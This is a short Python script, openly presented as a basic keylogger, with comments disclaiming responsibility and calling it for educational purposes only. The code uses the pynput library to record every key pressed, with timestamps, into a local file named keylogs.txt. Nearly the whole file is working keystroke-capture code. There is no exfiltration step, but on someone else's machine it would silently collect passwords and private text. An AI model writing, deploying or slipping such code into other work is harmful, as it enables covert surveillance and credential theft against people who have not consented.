#This is a basic keylogger created with the help of Youtbe videos.  It is poorly written and most likely will not work.
#If it does work, it will likely be detected and removed by antivirus immediatly.  
#However, if does work, it is for EDUCATIONAL PURPOSES ONLY and should not be used for any malicious reason.
#User assumes all responsibilty for the use of this code and any outcomes, hexs, curses, criminal charges, UN sanctions, bad luck or other misfortune that may result.

import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = "" #Directory for log file to be placed in (uses directory keylogger is stored in)

logging.basicConfig(filename=(log_dir + "keylogs.txt"), #Name of file to record keystrokes
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
